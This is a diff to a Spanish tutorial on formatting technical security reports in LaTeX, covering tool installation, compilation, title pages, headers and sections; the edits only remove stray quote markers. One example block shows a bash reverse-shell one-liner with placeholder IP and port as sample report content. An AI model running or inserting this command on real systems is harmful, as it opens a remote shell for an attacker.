@@ -54,24 +54,24 @@ published : Trues
 ```bash
  sudo apt-get install text-live-full zathura latexmk rubber -y --fix-missing
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese0.png">
 
 * Compilación de texto .tex a .pdf
 > latexmk -pdf Documento.tex
->
+
 <img src="imgs/redaccionDeInformes/Cheese1.png">
 
 
 * Para la visualización del documento pdf usamos zathura.
 > zathura Documento.pdf
->
+
 <img src="imgs/redaccionDeInformes/Cheese2.png">
 
 
 * Para poder ver el Documento.tex en tiempo real y poder editarlo a la vez.
 > latexmk -pdf -pvc Documento.tex
->
+
 <img src="imgs/redaccionDeInformes/Cheese3.png">
 
 <br>
@@ -190,7 +190,7 @@ published : Trues
 ```tex
 {\scshape\LARGE\textbf{Informe Tecnico.}\par\vspace{0.3cm}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese9.png">
 
 <br>
@@ -199,7 +199,7 @@ published : Trues
 ```texdisplay
 {\Huge\bfseries\textcolor{green}{Maquina \machineName}}\par
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese10.png">
 
 <br>
@@ -209,7 +209,7 @@ published : Trues
 % Este formato se tiene que incluir en variables de entorno es decir abajo de la importacion de la paqueteria.
 \lhead{\includegraphics[width=4cm]{\logo}}\rhead{\includegraphics[height=3cm,keepaspectratio]{\logMachine}}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese16.png">
 
 <br>
@@ -220,7 +220,7 @@ published : Trues
 \tableofcontents  % Crea la tabla de contenido "Indice".
 \clearpage % Salta de hoja para comenzar con el texto.
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese13.png">
 
 <br>
@@ -228,7 +228,7 @@ published : Trues
 ```tex
 \includegraphics[width=\textwidth,height=10cm,keepaspectratio]{\logMachine}\par\vspace{1cm}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese11.png">
 
 <br>
@@ -236,7 +236,7 @@ published : Trues
 ```tex
 \caption{Detalles de la maquina.} 
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese15.png">
 
 <br>
@@ -258,7 +258,7 @@ published : Trues
     \LARGE{Este documento es confidencial y contiene informacion sensible.\\Esta informacion no deberia compartirse con terceros.} % Importar texto
 \end{tcolorbox}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese12.png">
 
 <br>
@@ -266,7 +266,7 @@ published : Trues
 ```tex
 {\large\startDate\par}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese14.png">
 
 <br>
@@ -289,7 +289,7 @@ published : Trues
 ```text
 \section{Antecedentes}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese4.png">
 
 <br>
@@ -297,7 +297,7 @@ published : Trues
 ```text
 \subsection {Nueva subseccion.}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese5.png">
 
 <br>
@@ -319,7 +319,7 @@ Securizacion del sistema.
 \end{center}
 \end{figure}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese6.png">
 
 <br>
@@ -332,7 +332,7 @@ Puertos\tableofcontents
 22, 80, 4444
 \end{schema}
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese7.png">
 
 <br>
@@ -340,7 +340,7 @@ Puertos\tableofcontents
 ```tex
 /bin/bash -i >& /dev/tcp/{Ip}/{Puerto} 0>&1
 ```
->
+
 <img src="imgs/redaccionDeInformes/Cheese8.png">
 
 
